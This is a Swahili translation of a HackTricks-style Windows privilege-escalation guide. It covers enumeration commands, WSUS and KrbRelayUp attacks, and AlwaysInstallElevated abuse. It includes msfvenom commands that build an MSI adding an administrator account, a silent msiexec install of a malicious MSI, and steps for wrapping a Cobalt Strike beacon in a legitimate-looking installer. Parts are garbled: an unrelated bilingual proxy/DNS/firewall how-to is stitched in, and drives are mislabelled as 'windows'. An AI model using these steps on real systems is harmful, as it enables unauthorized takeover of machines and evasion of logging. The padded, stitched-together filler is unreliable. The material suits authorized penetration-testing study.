# Kupandisha Kiwango cha Mamlaka kwenye Windows

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) maalum
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Zana bora ya kutafuta njia za kupandisha kiwango cha mamlaka kwenye Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Nadharia ya Awali ya Windows

### Vitambulisho vya Upatikanaji

**Ikiwa haujui ni nini Vitambulisho vya Upatikanaji vya Windows, soma ukurasa ufuatao kabla ya kuendelea:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa habari zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Viwango vya Uadilifu

**Ikiwa haujui ni nini viwango vya uadilifu kwenye Windows, unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Udhibiti wa Usalama wa Windows

Kuna mambo tofauti kwenye Windows ambayo yanaweza **kukuzuia kuchunguza mfumo**, kuendesha faili za kutekelezwa, au hata **kugundua shughuli zako**. Unapaswa **kusoma** ukurasa **ufuatao** na **kuchunguza** ulinzi huu **kabla ya** kuanza uchunguzi wa kupandisha kiwango cha mamlaka:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Habari za Mfumo

### Uchunguzi wa habari za toleo

Angalia ikiwa toleo la Windows lina kasoro yoyote inayojulikana (angalia pia visasa vilivyowekwa).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Mbinu za Uvamizi wa Toleo

[Site](https://msrc.microsoft.com/update-guide/vulnerability) hii ni muhimu kwa kutafuta habari za kina kuhusu udhaifu wa usalama wa Microsoft. Hii ni database yenye zaidi ya udhaifu wa usalama 4,700, ikionyesha **eneo kubwa la shambulio** ambalo mazingira ya Windows yanatoa.

**Kwenye mfumo**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson iliyowekwa)_

**Kwa kutumia habari za mfumo kwenye kompyuta**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos ya mbinu za uvamizi:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna habari za siri/za thamani zilizohifadhiwa kwenye mazingira ya pembejeo?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Historia ya PowerShell

PowerShell ni lugha ya skrini ya amri na mazingira ya utendaji kazi ambayo inatumika kwa kazi za usimamizi na uendeshaji wa mfumo katika mifumo ya Windows. Inaruhusu watumiaji kutekeleza amri na script za PowerShell kwa kufanya kazi na vitu vya PowerShell kama vile moduli, cmdlets, na kazi.

Historia ya PowerShell inaweza kufuatiliwa nyuma hadi mwaka 2002 wakati Microsoft ilianza kufanya kazi kwenye mradi huo. Ilitolewa kwa mara ya kwanza kama sehemu ya Windows Server 2003 R2 na Windows Vista. Tangu wakati huo, PowerShell imekuwa sehemu muhimu ya mifumo ya Windows na imeendelea kuboreshwa na kusasishwa katika matoleo yake yanayofuata.

PowerShell ina kumbukumbu ya amri zote zilizotekelezwa na mtumiaji. Kumbukumbu hii inaitwa "PowerShell history" na inaweza kuwa na habari muhimu kwa watumiaji wa ngazi ya juu au wadukuzi. Kwa mfano, inaweza kuonyesha amri zilizotekelezwa na watumiaji wa mfumo au amri zilizotekelezwa na watumiaji wa kawaida ambazo zinaweza kusababisha uwezekano wa kupata ufikiaji wa kiwango cha juu.

Kumbukumbu ya PowerShell history inahifadhiwa kwenye faili ya historia ya PowerShell ambayo inapatikana kwenye mfumo wa uendeshaji. Kwa kawaida, faili hii iko katika saraka ya "C:\Users\<jina la mtumiaji>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\" na inaitwa "ConsoleHost_history.txt". Faili hii inaorodhesha amri zote zilizotekelezwa na mtumiaji pamoja na maelezo mengine kama vile wakati wa utekelezaji.

Kwa wadukuzi au watumiaji wenye ujuzi, kumbukumbu ya PowerShell history inaweza kutumiwa kwa faida yao. Wanaweza kutumia habari hii kugundua amri zilizotekelezwa na watumiaji wengine, kuchunguza mifumo ya kompyuta, au hata kutekeleza mashambulizi ya kuvuka mipaka. Ni muhimu kwa watumiaji kufahamu kuwa kumbukumbu hii inaweza kuwa na habari nyeti na inapaswa kulindwa kwa uangalifu.
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Faili za Kumbukumbu za PowerShell Transcript

Unaweza kujifunza jinsi ya kuwasha hii kwenye [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Kurekodi Moduli ya PowerShell

Maelezo ya utekelezaji wa mfuatano wa PowerShell yanarekodiwa, ikijumuisha amri zilizotekelezwa, wito wa amri, na sehemu za hati. Walakini, maelezo kamili ya utekelezaji na matokeo ya matokeo huenda yasirekodiwe.

Ili kuwezesha hili, fuata maagizo katika sehemu ya "Faili za Kumbukumbu" ya nyaraka, uchague **"Kurekodi Moduli"** badala ya **"Kurekodi PowerShell"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuona matukio 15 ya mwisho kutoka kwenye magogo ya Powershell, unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### Kurekodi wa Skripti za PowerShell

Shughuli kamili na rekodi kamili ya yaliyomo ya utekelezaji wa skripti inakamatwa, ikihakikisha kuwa kila kipande cha nambari kinaandikwa kama inavyoendesha. Mchakato huu unahifadhi mkia kamili wa ukaguzi wa kila shughuli, ambao ni muhimu kwa uchunguzi wa kisayansi na uchambuzi wa tabia mbaya. Kwa kurekodi shughuli zote wakati wa utekelezaji, ufahamu wa kina juu ya mchakato unapatikana.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio ya kuingiza skrini yanaweza kupatikana ndani ya Mwangalizi wa Matukio ya Windows kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho, unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Mtandao

#### Introduction

#### Utangulizi

In this section, we will discuss various internet settings that can be configured on a Windows system. These settings control how the system interacts with the internet and can affect its security and performance.

Katika sehemu hii, tutajadili mipangilio mbalimbali ya mtandao inayoweza kusanidiwa kwenye mfumo wa Windows. Mipangilio hii inadhibiti jinsi mfumo unavyoshirikiana na mtandao na inaweza kuathiri usalama na utendaji wake.

#### Proxy Settings

#### Mipangilio ya Proksi

Proxy settings allow a system to route its internet traffic through a proxy server. This can be useful for privacy, bypassing network restrictions, or caching web content.

Mipangilio ya proksi inaruhusu mfumo kupeleka trafiki yake ya mtandao kupitia seva ya proksi. Hii inaweza kuwa na manufaa kwa faragha, kuvuka vizuizi vya mtandao, au kuhifadhi yaliyomo ya wavuti.

To configure proxy settings on a Windows system, follow these steps:

Kuweka mipangilio ya proksi kwenye mfumo wa Windows, fuata hatua hizi:

1. Open the **Control Panel** and navigate to **Internet Options**.

1. Fungua **Control Panel** na nenda kwenye **Internet Options**.

2. In the **Internet Options** window, go to the **Connections** tab and click on the **LAN settings** button.

2. Katika dirisha la **Internet Options**, nenda kwenye kichupo cha **Connections** na bonyeza kitufe cha **LAN settings**.

3. In the **Local Area Network (LAN) Settings** window, check the box for **Use a proxy server for your LAN**.

3. Katika dirisha la **Local Area Network (LAN) Settings**, angalia sanduku la **Use a proxy server for your LAN**.

4. Enter the IP address or hostname of the proxy server in the **Address** field and the port number in the **Port** field.

4. Ingiza anwani ya IP au jina la mwenyeji wa seva ya proksi kwenye uga wa **Address** na nambari ya bandari kwenye uga wa **Port**.

5. If the proxy server requires authentication, click on the **Advanced** button and enter the username and password in the respective fields.

5. Ikiwa seva ya proksi inahitaji uwakiki, bonyeza kitufe cha **Advanced** na ingiza jina la mtumiaji na nywila kwenye uga husika.

6. Click **OK** to save the changes and close the windows.

6. Bonyeza **OK** ili kuhifadhi mabadiliko na kufunga dirisha.

#### DNS Settings

#### Mipangilio ya DNS

DNS settings determine how a system resolves domain names to IP addresses. By default, Windows systems use the DNS servers provided by the network's DHCP server. However, you can manually configure DNS settings to use specific DNS servers.

Mipangilio ya DNS inaamua jinsi mfumo unavyotatua majina ya kikoa kuwa anwani za IP. Kwa chaguo-msingi, mifumo ya Windows hutumia seva za DNS zinazotolewa na seva ya DHCP ya mtandao. Walakini, unaweza kusanidi mipangilio ya DNS kwa kutumia seva za DNS maalum.

To configure DNS settings on a Windows system, follow these steps:

Kuweka mipangilio ya DNS kwenye mfumo wa Windows, fuata hatua hizi:

1. Open the **Control Panel** and navigate to **Network and Internet**.

1. Fungua **Control Panel** na nenda kwenye **Network and Internet**.

2. Click on **Network and Sharing Center**.

2. Bonyeza **Network and Sharing Center**.

3. In the **Network and Sharing Center** window, click on **Change adapter settings**.

3. Katika dirisha la **Network and Sharing Center**, bonyeza **Change adapter settings**.

4. Right-click on the network adapter you want to configure and select **Properties**.

4. Bonyeza kulia kwenye kifaa cha mtandao unachotaka kusanidi na chagua **Properties**.

5. In the **Properties** window, select **Internet Protocol Version 4 (TCP/IPv4)** and click on the **Properties** button.

5. Katika dirisha la **Properties**, chagua **Internet Protocol Version 4 (TCP/IPv4)** na bonyeza kitufe cha **Properties**.

6. In the **Internet Protocol Version 4 (TCP/IPv4) Properties** window, select **Use the following DNS server addresses**.

6. Katika dirisha la **Internet Protocol Version 4 (TCP/IPv4) Properties**, chagua **Use the following DNS server addresses**.

7. Enter the IP addresses of the preferred and alternate DNS servers in the respective fields.

7. Ingiza anwani za IP za seva za DNS zilizopendelewa na mbadala kwenye uga husika.

8. Click **OK** to save the changes and close the windows.

8. Bonyeza **OK** ili kuhifadhi mabadiliko na kufunga dirisha.

#### Firewall Settings

#### Mipangilio ya Firewall

Firewall settings control the incoming and outgoing network traffic on a system. Windows systems have a built-in firewall that can be configured to allow or block specific connections.

Mipangilio ya firewall inadhibiti trafiki ya mtandao ya kuingia na kutoka kwenye mfumo. Mifumo ya Windows ina firewall iliyojengwa ambayo inaweza kusanidiwa kuruhusu au kuzuia uhusiano maalum.

To configure firewall settings on a Windows system, follow these steps:

Kuweka mipangilio ya firewall kwenye mfumo wa Windows, fuata hatua hizi:

1. Open the **Control Panel** and navigate to **System and Security**.

1. Fungua **Control Panel** na nenda kwenye **System and Security**.

2. Click on **Windows Defender Firewall**.

2. Bonyeza **Windows Defender Firewall**.

3. In the **Windows Defender Firewall** window, click on **Advanced settings**.

3. Katika dirisha la **Windows Defender Firewall**, bonyeza **Advanced settings**.

4. In the **Windows Defender Firewall with Advanced Security** window, you can configure inbound and outbound rules to allow or block specific connections.

4. Katika dirisha la **Windows Defender Firewall with Advanced Security**, unaweza kusanidi sheria za kuingia na kutoka ili kuruhusu au kuzuia uhusiano maalum.

5. Right-click on **Inbound Rules** or **Outbound Rules** and select **New Rule** to create a new rule.

5. Bonyeza kulia kwenye **Inbound Rules** au **Outbound Rules** na chagua **New Rule** ili kuunda sheria mpya.

6. Follow the wizard to specify the rule's properties, such as the protocol, port, and action (allow or block).

6. Fuata mwongozo ili kubainisha mali za sheria, kama itifaki, bandari, na hatua (kuruhusu au kuzuia).

7. Click **Finish** to save the rule.

7. Bonyeza **Finish** ili kuhifadhi sheria.

By configuring these internet settings, you can customize how your Windows system interacts with the internet and enhance its security and performance.

Kwa kusanidi mipangilio hii ya mtandao, unaweza kubinafsisha jinsi mfumo wako wa Windows unavyoshirikiana na mtandao na kuimarisha usalama na utendaji wake.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Madirisha

Madirisha ni sehemu za uhifadhi wa data kwenye kompyuta yako. Kila dirisha ina jina la kipekee na inaweza kuwa na faili na folda ndani yake. Kuna aina tofauti za madirisha, kama vile C: drive, D: drive, na kadhalika. Madirisha ya kawaida kwenye mfumo wa Windows ni C: drive, ambayo mara nyingi ina mfumo wa uendeshaji, na D: drive, ambayo inaweza kutumika kwa uhifadhi wa data zaidi.

Kuwa na ufahamu wa madirisha kwenye kompyuta yako ni muhimu katika kuelewa jinsi ya kufikia na kusimamia faili na folda zako. Unaweza kutumia amri za mfumo kama vile `dir` kuona yaliyomo kwenye dirisha fulani, au `cd` kuhamia kutoka dirisha moja hadi lingine.

Ni muhimu pia kuzingatia usalama wa madirisha yako. Kuhakikisha kuwa madirisha yako yamehifadhiwa vizuri na kuwa na ufikiaji wa kutosha ni muhimu katika kuzuia upenyezaji wa data na kuboresha usalama wa mfumo wako.
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kudhoofisha mfumo ikiwa sasisho hazijaulizwa kwa kutumia http**S** bali http.

Anza kwa kuhakiki ikiwa mtandao unatumia sasisho za WSUS zisizo za SSL kwa kukimbia yafuatayo:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ikiwa unapata jibu kama hili:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ni sawa na `1`.

Basi, **inaweza kudukuliwa.** Ikiwa usajili wa mwisho ni sawa na 0, basi, kuingia kwa WSUS itapuuzwa.

Ili kudukua udhaifu huu, unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - Hizi ni hatari za kudukua zana za kuingiza sasisho za 'bandia' katika trafiki ya WSUS isiyo ya SSL.

Soma utafiti hapa:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kimsingi, hii ndio kasoro ambayo kosa hili linadukua:

> Ikiwa tuna uwezo wa kurekebisha proksi yetu ya mtumiaji wa ndani, na Sasisho za Windows hutumia proksi iliyoconfigure katika mipangilio ya Internet Explorer, kwa hivyo tuna uwezo wa kukimbia [PyWSUS](https://github.com/GoSecure/pywsus) kwa kiwango cha ndani ili kuvuruga trafiki yetu na kukimbia nambari kama mtumiaji aliyeinuliwa kwenye mali yetu.
>
> Zaidi ya hayo, tangu huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, pia itatumia uhifadhi wake wa vyeti. Ikiwa tunazalisha cheti cha kujisaini kwa jina la mwenyeji wa WSUS na kuongeza cheti hiki kwenye uhifadhi wa vyeti wa mtumiaji wa sasa, tutaweza kuvuruga trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii vifaa kama HSTS kutekeleza uthibitisho wa aina ya kuamini kwa mara ya kwanza kwenye cheti. Ikiwa cheti kilichowasilishwa kinaaminika na mtumiaji na kina jina la mwenyeji sahihi, kitakubaliwa na huduma.

Unaweza kutumia udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (baada ya kuachiwa).

## KrbRelayUp

Kuna udhaifu wa **kuinua haki za mtumiaji wa ndani** katika mazingira ya Windows ya **kikoa** chini ya hali maalum. Hali hizi ni pamoja na mazingira ambapo **LDAP signing haijaamrishwa,** watumiaji wana haki za kujisimamia kuruhusu kuweka **Utekelezaji wa Kizuizi cha Rasilimali (RBCD),** na uwezo wa watumiaji kuunda kompyuta ndani ya kikoa. Ni muhimu kutambua kuwa **mahitaji** haya yanakidhiwa kwa kutumia **mipangilio ya msingi**.

Pata udhaifu huu katika [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa habari zaidi kuhusu mchakato wa shambulio angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ikiwa** usajili huu 2 umewezeshwa (thamani ni **0x1**), basi watumiaji wenye haki yoyote wanaweza **kusanikisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Malipo ya Metasploit

Metasploit ni chombo maarufu cha kufanya udukuzi ambacho kinatumika kwa kubuni na kutekeleza malipo. Malipo haya yanaweza kutumiwa kwa madhumuni mbalimbali, ikiwa ni pamoja na kudhibiti kompyuta zilizodukuliwa, kuongeza mamlaka ya mtumiaji, au kufanya shughuli zingine za udukuzi.

Metasploit inatoa aina tofauti za malipo ambazo zinaweza kutumiwa kulingana na mahitaji ya udukuzi. Baadhi ya malipo maarufu ni pamoja na:

- **Reverse Shell Payloads**: Malipo haya yanaruhusu mtumiaji kudhibiti kompyuta iliyodukuliwa kutoka kwa kifaa chao cha kudukua. Hii inawezesha mtumiaji kufanya shughuli za udukuzi kwenye kompyuta iliyodukuliwa kwa urahisi.

- **Meterpreter Payloads**: Malipo haya yanatoa uwezo wa kudhibiti kompyuta iliyodukuliwa kwa njia ya kipekee inayoitwa "Meterpreter". Meterpreter inatoa zana nyingi za kudukua na kufanya shughuli za udukuzi, kama vile kukusanya habari, kudhibiti faili, na kufanya uchunguzi wa mtandao.

- **Web Payloads**: Malipo haya yanaruhusu mtumiaji kutekeleza shughuli za udukuzi kupitia tovuti iliyodukuliwa. Hii inaweza kujumuisha kutekeleza mashambulizi ya msimbo wa upande wa mteja au kuchukua udhibiti wa seva ya wavuti.

Kwa kuzingatia malipo haya, Metasploit inatoa njia mbalimbali za kubuni na kutekeleza malipo kulingana na mahitaji ya udukuzi. Hii inawawezesha wadukuzi kufanya shughuli za udukuzi kwa ufanisi na kwa urahisi.
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una kikao cha meterpreter unaweza kutekeleza mbinu hii kiotomatiki kwa kutumia moduli **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka kwa power-up ili kuunda ndani ya saraka ya sasa faili ya Windows MSI ili kuinua mamlaka. Skripti hii inaandika faili ya usanidi ya MSI iliyopangwa ambayo inaomba kuongeza mtumiaji/kikundi (kwa hivyo utahitaji ufikiaji wa GUI):
```
Write-UserAddMSI
```
Chukua faili iliyoundwa na uitekeleze ili kuongeza mamlaka.

### Mfuko wa MSI

Soma mafunzo haya ili kujifunza jinsi ya kuunda mfuko wa MSI kwa kutumia zana hii. Kumbuka kuwa unaweza kufunga faili ya "**.bat**" ikiwa unataka tu kutekeleza mistari ya amri.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Unda MSI na WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Unda MSI na Visual Studio

* **Tengeneza** na Cobalt Strike au Metasploit **malipo ya TCP ya Windows EXE mpya** katika `C:\privesc\beacon.exe`
* Fungua **Visual Studio**, chagua **Tengeneza mradi mpya** na andika "installer" katika sanduku la utaftaji. Chagua mradi wa **Mchawi wa Usanidi** na bonyeza **Next**.
* Wapa mradi jina, kama vile **AlwaysPrivesc**, tumia **`C:\privesc`** kwa eneo, chagua **weka suluhisho na mradi katika saraka moja**, na bonyeza **Unda**.
* Endelea bonyeza **Next** hadi ufikie hatua ya 3 kati ya 4 (chagua faili za kuingiza). Bonyeza **Ongeza** na chagua malipo ya Beacon uliyounda tu. Kisha bonyeza **Maliza**.
* Weka mradi wa **AlwaysPrivesc** katika **Explorer ya Suluhisho** na katika **Mali**, badilisha **Lengo la Jukwaa** kutoka **x86** hadi **x64**.
* Kuna mali zingine unaweza kubadilisha, kama vile **Mwandishi** na **Mzalishaji** ambayo inaweza kufanya programu iliyosanikishwa ionekane halali zaidi.
* Bonyeza kulia kwenye mradi na chagua **Angalia > Vitendo Maalum**.
* Bonyeza kulia **Sakinisha** na chagua **Ongeza Hatua Maalum**.
* Bonyeza mara mbili kwenye **Folda ya Programu**, chagua faili yako ya **beacon.exe** na bonyeza **Sawa**. Hii itahakikisha kuwa malipo ya beacon yanatekelezwa mara tu usanidi unapoendeshwa.
* Chini ya **Mali za Hatua Maalum**, badilisha **Run64Bit** kuwa **Sahihi**.
* Hatimaye, **ijenge**.
* Ikiwa onyo `Faili 'beacon-tcp.exe' inayolenga 'x64' haiwezi kufanya kazi na jukwaa la lengo la mradi 'x86'` inaonyeshwa, hakikisha umeweka jukwaa kuwa x64.

### Usanikishaji wa MSI

Ili kutekeleza **usanikishaji** wa faili ya `.msi` yenye nia mbaya **kwa siri:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Kutumia udhaifu huu unaweza kutumia: _exploit/windows/local/always\_install\_elevated_

## Antivirus na Detectors

### Mipangilio ya Ukaguzi

Mipangilio hii inaamua ni nini kinachopokelewa **kwenye kumbukumbu**, hivyo unapaswa kuwa makini
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni muhimu kujua wapi kumbukumbu zinatumwa.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Msimamizi wa Mitaa**, ikihakikisha kuwa kila nywila ni **ya kipekee, imechanganywa, na inasasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye kikoa. Nywila hizi zimehifadhiwa salama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji ambao wamepewa ruhusa ya kutosha kupitia ACLs, kuruhusu kuona nywila za msimamizi wa mitaa ikiwa wameruhusiwa.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Ikiwa imeamilishwa, **nywila za maandishi wazi zimehifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest katika ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Ulinzi wa LSA

Kuanzia **Windows 8.1**, Microsoft iliingiza ulinzi ulioboreshwa kwa Mamlaka ya Usalama wa Ndani (LSA) ili **kuzuia** jaribio la michakato isiyotegemewa kusoma kumbukumbu yake au kuingiza namna ya programu, kuimarisha zaidi mfumo.\
[**Maelezo zaidi kuhusu Ulinzi wa LSA hapa**](../stealing-credentials/credentials-protections.md#ulinzi-wa-lsa).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Mlinzi wa Vitambulisho

**Mlinzi wa Vitambulisho** uliingizwa katika **Windows 10**. Lengo lake ni kulinda vitambulisho vilivyohifadhiwa kwenye kifaa dhidi ya vitisho kama mashambulizi ya pass-the-hash.
[**Maelezo zaidi kuhusu Mlinzi wa Vitambulisho hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Vitambulisho Vilivyohifadhiwa

**Vitambulisho vya kikoa** huthibitishwa na **Mamlaka ya Usalama wa Ndani** (LSA) na hutumiwa na sehemu za mfumo wa uendeshaji. Wakati data ya kuingia ya mtumiaji inathibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida vitambulisho vya kikoa kwa mtumiaji huwekwa.\
[**Maelezo zaidi kuhusu Vitambulisho Vilivyohifadhiwa hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji na Vikundi

### Kuchunguza Watumiaji na Vikundi

Unapaswa kuchunguza ikiwa kuna vikundi ambavyo unahusika navyo na vinayo ruhusa za kuvutia.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vya wenye mamlaka

Ikiwa **unaingia kwenye kikundi cha wenye mamlaka unaweza kuongeza mamlaka**. Jifunze kuhusu vikundi vya wenye mamlaka na jinsi ya kuvitumia kwa kuongeza mamlaka hapa:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Usindikaji wa alama

**Jifunze zaidi** kuhusu nini ni **alama** kwenye ukurasa huu: [**Alama za Windows**](../authentication-credentials-uac-and-efs.md#access-tokens).\
Angalia ukurasa ufuatao ili **kujifunza kuhusu alama za kuvutia** na jinsi ya kuzitumia vibaya:

